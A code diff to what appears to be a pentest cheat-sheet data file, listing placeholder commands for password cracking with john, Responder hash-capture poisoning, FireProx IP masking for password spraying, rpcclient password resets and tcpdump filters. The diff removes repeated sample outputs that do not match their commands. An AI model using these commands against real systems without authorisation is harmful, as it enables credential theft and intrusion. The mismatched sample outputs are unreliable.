-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
       { title: 'john — Format search', desc: 'Find specific hash format', diff: 'medium', code: 'john --list=formats | grep -i <keyword>' },
-  output: '
-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
       { title: 'john — NTLM', desc: 'Crack Windows NTLM hash', diff: 'medium', code: 'john --format=NT --wordlist=<wordlist> <hashfile>' },
-  output: '
-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
       { title: 'john — LM', desc: 'Crack Windows LM hash', diff: 'medium', code: 'john --format=LM --wordlist=<wordlist> <hashfile>' },
-  output: '
-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
       { title: 'john — Linux crypt', desc: 'Crack Linux /etc/shadow', diff: 'hard', code: 'john --format=crypt --wordlist=<wordlist> <hashfile>' },
-  output: '
-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
       { title: 'john — unshadow', desc: 'Merge passwd + shadow for cracking', diff: 'hard', code: [
         'unshadow <passwd> <shadow> > <output>',
         'john --wordlist=<wordlist> <output>',
       ]},
-  output: '
-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
       { title: 'john — zip2john', desc: 'Extract hash from encrypted ZIP', diff: 'hard', code: [
         'zip2john <file>.zip > <hash_output>',
         'john --wordlist=<wordlist> <hash_output>',
         'unzip <file>.zip',
       ]},
-  output: '
-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
       { title: 'john — rar2john', desc: 'Extract hash from encrypted RAR', diff: 'hard', code: [
         'rar2john <file>.rar > <hash_output>',
         'john --wordlist=<wordlist> <hash_output>',
         'unrar x <file>.rar',
       ]},
-  output: '
-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
       { title: 'john — ssh2john', desc: 'Crack SSH private key passphrase', diff: 'hard', code: [
         'ssh2john.py <id_rsa> > <hash_output>',
         'john --wordlist=<wordlist> <hash_output>',
       ]},
-  output: '
-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
       { title: 'john — pdf2john', desc: 'Extract hash from encrypted PDF', diff: 'hard', code: [
         'pdf2john <file>.pdf > <hash_output>',
         'john --wordlist=<wordlist> <hash_output>',
       ]},
-  output: '
-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
       { title: 'john — office2john', desc: 'Extract hash from encrypted Excel/Office', diff: 'hard', code: [
         'office2john.py <file>.xlsx > <hash_output>',
         'john --wordlist=<wordlist> <hash_output>',
       ]},
-  output: '
-Loaded 3 password hashes (sha256crypt)
-Proceeding with wordlist
-admin123   (admin)
-p@ssw0rd   (root)
-
-2 password hashes cracked'
     ]
   },
   {
@@ -1627,101 +412,21 @@ p@ssw0rd   (root)
     title: 'Network — Responder (LLMNR/NBT-NS Poisoning)',
     commands: [
       { title: 'responder — Basic', desc: 'Start poisoning on interface', diff: 'hard', code: 'responder -I <interface>' },
-  output: '
-[HTTP] Received NTLMv2 hash for WORKSTATION\admin
-[HTTP] Username: WORKSTATION\admin
-[SMB] NTLMv2-SSP Client: 10.10.10.100
-[SMB] NTLMv2-SSP Username: CORP\jdoe'
       { title: 'responder — Analyze mode', desc: 'Monitor without poisoning', diff: 'medium', code: 'responder -I <interface> -A' },
-  output: '
-[HTTP] Received NTLMv2 hash for WORKSTATION\admin
-[HTTP] Username: WORKSTATION\admin
-[SMB] NTLMv2-SSP Client: 10.10.10.100
-[SMB] NTLMv2-SSP Username: CORP\jdoe'
       { title: 'responder — WPAD proxy', desc: 'Enable rogue WPAD proxy server', diff: 'hard', code: 'responder -I <interface> -w' },
-  output: '
-[HTTP] Received NTLMv2 hash for WORKSTATION\admin
-[HTTP] Username: WORKSTATION\admin
-[SMB] NTLMv2-SSP Client: 10.10.10.100
-[SMB] NTLMv2-SSP Username: CORP\jdoe'
       { title: 'responder — Force WPAD auth', desc: 'Force WPAD authentication capture', diff: 'hard', code: 'responder -I <interface> -w -F' },
-  output: '
-[HTTP] Received NTLMv2 hash for WORKSTATION\admin
-[HTTP] Username: WORKSTATION\admin
-[SMB] NTLMv2-SSP Client: 10.10.10.100
-[SMB] NTLMv2-SSP Username: CORP\jdoe'
       { title: 'responder — Disable SMB', desc: 'Turn off SMB server module', diff: 'medium', code: 'responder -I <interface> --disable-smb' },
-  output: '
-[HTTP] Received NTLMv2 hash for WORKSTATION\admin
-[HTTP] Username: WORKSTATION\admin
-[SMB] NTLMv2-SSP Client: 10.10.10.100
-[SMB] NTLMv2-SSP Username: CORP\jdoe'
       { title: 'responder — Disable HTTP', desc: 'Turn off HTTP server module', diff: 'medium', code: 'responder -I <interface> --disable-http' },
-  output: '
-[HTTP] Received NTLMv2 hash for WORKSTATION\admin
-[HTTP] Username: WORKSTATION\admin
-[SMB] NTLMv2-SSP Client: 10.10.10.100
-[SMB] NTLMv2-SSP Username: CORP\jdoe'
       { title: 'responder — Fingerprinting', desc: 'Enable OS/host fingerprinting', diff: 'hard', code: 'responder -I <interface> -f' },
-  output: '
-[HTTP] Received NTLMv2 hash for WORKSTATION\admin
-[HTTP] Username: WORKSTATION\admin
-[SMB] NTLMv2-SSP Client: 10.10.10.100
-[SMB] NTLMv2-SSP Username: CORP\jdoe'
       { title: 'responder — Verbose', desc: 'Detailed runtime output', diff: 'medium', code: 'responder -I <interface> -v' },
-  output: '
-[HTTP] Received NTLMv2 hash for WORKSTATION\admin
-[HTTP] Username: WORKSTATION\admin
-[SMB] NTLMv2-SSP Client: 10.10.10.100
-[SMB] NTLMv2-SSP Username: CORP\jdoe'
       { title: 'responder — Log directory', desc: 'Custom log path', diff: 'medium', code: 'responder -I <interface> -o <path>' },
-  output: '
-[HTTP] Received NTLMv2 hash for WORKSTATION\admin
-[HTTP] Username: WORKSTATION\admin
-[SMB] NTLMv2-SSP Client: 10.10.10.100
-[SMB] NTLMv2-SSP Username: CORP\jdoe'
       { title: 'responder — All interfaces', desc: 'Listen on every interface', diff: 'hard', code: 'responder -I all' },
-  output: '
-[HTTP] Received NTLMv2 hash for WORKSTATION\admin
-[HTTP] Username: WORKSTATION\admin
-[SMB] NTLMv2-SSP Client: 10.10.10.100
-[SMB] NTLMv2-SSP Username: CORP\jdoe'
       { title: 'responder — DHCP poison', desc: 'Enable DHCP poisoning', diff: 'hard', code: 'responder -I <interface> -d' },
-  output: '
-[HTTP] Received NTLMv2 hash for WORKSTATION\admin
-[HTTP] Username: WORKSTATION\admin
-[SMB] NTLMv2-SSP Client: 10.10.10.100
-[SMB] NTLMv2-SSP Username: CORP\jdoe'
       { title: 'responder — Custom challenge', desc: 'Set custom NTLM challenge', diff: 'hard', code: 'responder -I <interface> --challenge <hex>' },
-  output: '
-[HTTP] Received NTLMv2 hash for WORKSTATION\admin
-[HTTP] Username: WORKSTATION\admin
-[SMB] NTLMv2-SSP Client: 10.10.10.100
-[SMB] NTLMv2-SSP Username: CORP\jdoe'
       { title: 'responder — LM downgrade', desc: 'Force LM hash downgrade', diff: 'hard', code: 'responder -I <interface> --lm' },
-  output: '
-[HTTP] Received NTLMv2 hash for WORKSTATION\admin
-[HTTP] Username: WORKSTATION\admin
-[SMB] NTLMv2-SSP Client: 10.10.10.100
-[SMB] NTLMv2-SSP Username: CORP\jdoe'
       { title: 'responder — Disable NBT-NS', desc: 'Disable NBT-NS poisoning', diff: 'medium', code: 'responder -I <interface> --disable-nbt' },
-  output: '
-[HTTP] Received NTLMv2 hash for WORKSTATION\admin
-[HTTP] Username: WORKSTATION\admin
-[SMB] NTLMv2-SSP Client: 10.10.10.100
-[SMB] NTLMv2-SSP Username: CORP\jdoe'
       { title: 'responder — Disable mDNS', desc: 'Disable multicast DNS', diff: 'medium', code: 'responder -I <interface> --disable-mdns' },
-  output: '
-[HTTP] Received NTLMv2 hash for WORKSTATION\admin
-[HTTP] Username: WORKSTATION\admin
-[SMB] NTLMv2-SSP Client: 10.10.10.100
-[SMB] NTLMv2-SSP Username: CORP\jdoe'
       { title: 'responder — Redirect domain', desc: 'Target specific domain', diff: 'hard', code: 'responder -I <interface> -r <domain>' },
-  output: '
-[HTTP] Received NTLMv2 hash for WORKSTATION\admin
-[HTTP] Username: WORKSTATION\admin
-[SMB] NTLMv2-SSP Client: 10.10.10.100
-[SMB] NTLMv2-SSP Username: CORP\jdoe'
     ]
   },
   {
@@ -1779,23 +484,7 @@ p@ssw0rd   (root)
       { title: 'fireprox — Specific method', desc: 'Enable GET/POST etc', diff: 'medium', code: 'python3 fire.py --url <target_url> --method <method>' },
       { title: 'fireprox — Multiple methods', desc: 'Enable several HTTP methods', diff: 'medium', code: 'python3 fire.py --url <target_url> --method GET POST PUT' },
       { title: 'fireprox — Curl through proxy', desc: 'Send request via FireProx endpoint', diff: 'easy', code: 'curl https://<api_id>.execute-api.<region>.amazonaws.com/fireprox/' },
-  output: '
-HTTP/1.1 200 OK
-Server: Apache/2.4.57 (Ubuntu)
-Content-Type: text/html
-Content-Length: 12345
-
-<!DOCTYPE html>
-<html><head><title>Site</title></head><body>...</body></html>'
       { title: 'fireprox — Curl POST', desc: 'POST request through proxy', diff: 'medium', code: 'curl -X POST -d "<data>" https://<api_id>.execute-api.<region>.amazonaws.com/fireprox/<path>' },
-  output: '
-HTTP/1.1 200 OK
-Server: Apache/2.4.57 (Ubuntu)
-Content-Type: text/html
-Content-Length: 12345
-
-<!DOCTYPE html>
-<html><head><title>Site</title></head><body>...</body></html>'
       { title: 'fireprox — M365 spray', desc: 'Mask IP during password spray', diff: 'hard', code: 'python3 fire.py --url https://login.microsoftonline.com' },
     ]
   },
@@ -1895,12 +584,6 @@ Content-Length: 12345
       { title: 'rpcclient — Set password', desc: 'Change user password via RPC', diff: 'hard', code: 'rpcclient -U <admin> <target> -c \'setuserinfo2 <user> 23 "<pass>"\'' },
       { title: 'rpcclient — Multi commands', desc: 'Run several queries at once', diff: 'hard', code: 'rpcclient -U "" -N <target> -c "enumdomusers; getdompwinfo"' },
       { title: 'ssh — Tunnel', desc: 'Local port forward through SSH', diff: null, code: 'ssh -L <local_port>:<remote_host>:<remote_port> <user>@<jump_host>' },
-  output: '
-The authenticity of host 10.10.10.1 can be established.
-ED25519 key fingerprint: SHA256:abc123...
-user@10.10.10.1 password:
-Linux webserver 5.15.0-86-generic
-user@webserver:~$'
     ]
   },
   {
@@ -2043,257 +726,47 @@ user@webserver:~$'
     title: 'Network — tcpdump',
     commands: [
       { title: 'tcpdump — List interfaces', desc: 'Show available capture interfaces', diff: 'easy', code: 'tcpdump -D' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Capture on interface', desc: 'Capture packets on specific NIC', diff: 'easy', code: 'tcpdump -i <interface>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Write to file', desc: 'Save captured packets to PCAP', diff: 'easy', code: 'tcpdump -w <output>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Read from file', desc: 'Read packets from saved PCAP', diff: 'easy', code: 'tcpdump -r <pcap>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Count packets', desc: 'Stop after N packets', diff: 'easy', code: 'tcpdump -c <count> -i <interface>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — No resolution', desc: 'Don\'t resolve hostnames/ports', diff: 'easy', code: 'tcpdump -n -r <pcap>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Full no resolution', desc: 'Don\'t resolve IPs or ports', diff: 'easy', code: 'tcpdump -nn -r <pcap>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Verbose', desc: 'Detailed output (add -vv -vvv)', diff: 'medium', code: 'tcpdump -v -r <pcap>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Quiet', desc: 'Brief packet info', diff: 'easy', code: 'tcpdump -q -r <pcap>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — MAC addresses', desc: 'Display link-layer headers', diff: 'medium', code: 'tcpdump -e -r <pcap>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — ASCII output', desc: 'Print packets as ASCII', diff: 'medium', code: 'tcpdump -A -r <pcap>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Hex dump', desc: 'Show packets in hex + ASCII', diff: 'medium', code: 'tcpdump -X -r <pcap>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Hex + link-layer', desc: 'Hex dump with MAC headers', diff: 'hard', code: 'tcpdump -xx -r <pcap>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Line numbers', desc: 'Display packet numbers', diff: 'easy', code: 'tcpdump -# -r <pcap>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Timestamps', desc: 'Print Unix timestamps', diff: 'easy', code: 'tcpdump -tt -r <pcap>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Filter by host', desc: 'Capture from/to specific IP', diff: 'easy', code: 'tcpdump host <ip>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Source host', desc: 'Capture from source IP', diff: 'easy', code: 'tcpdump src host <ip>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Dest host', desc: 'Capture to destination IP', diff: 'easy', code: 'tcpdump dst host <ip>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Filter by net', desc: 'Capture traffic to/from subnet', diff: 'medium', code: 'tcpdump net <subnet>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Filter by port', desc: 'Capture traffic on port', diff: 'easy', code: 'tcpdump port <port>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Source port', desc: 'Filter by source port', diff: 'medium', code: 'tcpdump src port <port>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Dest port', desc: 'Filter by destination port', diff: 'medium', code: 'tcpdump dst port <port>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Protocol TCP', desc: 'Filter TCP traffic only', diff: 'easy', code: 'tcpdump tcp' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Protocol UDP', desc: 'Filter UDP traffic only', diff: 'easy', code: 'tcpdump udp' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Protocol ICMP', desc: 'Filter ICMP traffic only', diff: 'easy', code: 'tcpdump icmp' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Protocol ARP', desc: 'Filter ARP traffic only', diff: 'medium', code: 'tcpdump arp' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — IPv4 only', desc: 'Filter IPv4 packets', diff: 'easy', code: 'tcpdump ip' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — IPv6 only', desc: 'Filter IPv6 packets', diff: 'easy', code: 'tcpdump ip6' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Logical AND', desc: 'Combine filters with AND', diff: 'medium', code: 'tcpdump <filter1> and <filter2>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Logical OR', desc: 'Combine filters with OR', diff: 'medium', code: 'tcpdump <filter1> or <filter2>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Logical NOT', desc: 'Exclude matching packets', diff: 'medium', code: 'tcpdump not <filter>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Packet length >', desc: 'Filter packets larger than N bytes', diff: 'medium', code: 'tcpdump greater <bytes>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Packet length <', desc: 'Filter packets smaller than N bytes', diff: 'medium', code: 'tcpdump less <bytes>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — SYN flag', desc: 'Filter TCP SYN packets', diff: 'hard', code: 'tcpdump "tcp[tcpflags] == tcp-syn"' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — ACK flag', desc: 'Filter TCP ACK packets', diff: 'hard', code: 'tcpdump "tcp[tcpflags] == tcp-ack"' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — FIN flag', desc: 'Filter TCP FIN packets', diff: 'hard', code: 'tcpdump "tcp[tcpflags] & tcp-fin != 0"' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — RST flag', desc: 'Filter TCP RST packets', diff: 'hard', code: 'tcpdump "tcp[tcpflags] & tcp-rst != 0"' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — SYN-ACK', desc: 'Filter SYN-ACK (0x12)', diff: 'hard', code: 'tcpdump "tcp[tcpflags] == 0x12"' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — FIN+RST', desc: 'Filter termination flags', diff: 'hard', code: 'tcpdump -r <pcap> -nt \'tcp[13] & 0x05 != 0\'' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — Snapshot length', desc: 'Set bytes captured per packet', diff: 'medium', code: 'tcpdump -s <bytes> -i <interface>' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — ARP request', desc: 'Identify who asked for a MAC', diff: 'hard', code: 'tcpdump -n -r <pcap> \'arp and arp[6:2] == 1\'' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
       { title: 'tcpdump — DNS capture live', desc: 'Capture DNS traffic and save', diff: 'hard', code: 'tcpdump -n -i <interface> -w <output> \'udp port 53\'' },
-  output: '
-listening on eth0
-14:30:01.123456 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [S]
-14:30:01.123789 IP 10.10.10.1.80 > 10.10.14.5.54321: Flags [S.]
-14:30:01.124500 IP 10.10.14.5.54321 > 10.10.10.1.80: Flags [P.]'
     ]
   },
   {
@@ -2475,15 +948,6 @@ listening on eth0
       { title: 'eyewitness — Scan URL list', desc: 'Screenshot all URLs from file', diff: 'easy', code: 'eyewitness -f <url_file> -d <output> --web' },
       { title: 'eyewitness — Single target', desc: 'Screenshot one website', diff: 'easy', code: 'eyewitness --single <url> -d <output>' },
       { title: 'eyewitness — From Nmap XML', desc: 'Screenshot targets from Nmap scan', diff: 'medium', code: 'eyewitness -x <nmap_xml> -d <output> --web' },
-  output: '
-Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 10.10.10.1
-Host is up (0.042s latency).
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Nmap done: 1 IP address (1 host up) scanned in 3.42s'
       { title: 'eyewitness — Resume scan', desc: 'Continue interrupted session', diff: 'medium', code: 'eyewitness --resume <database>.db' },
       { title: 'eyewitness — Faster threads', desc: 'Speed up with parallel threads', diff: 'medium', code: 'eyewitness -f <url_file> -d <output> --threads <count>' },
       { title: 'eyewitness — Slow/stealth', desc: 'Add delay between requests', diff: 'medium', code: 'eyewitness -f <url_file> -d <output> --delay <seconds>' },
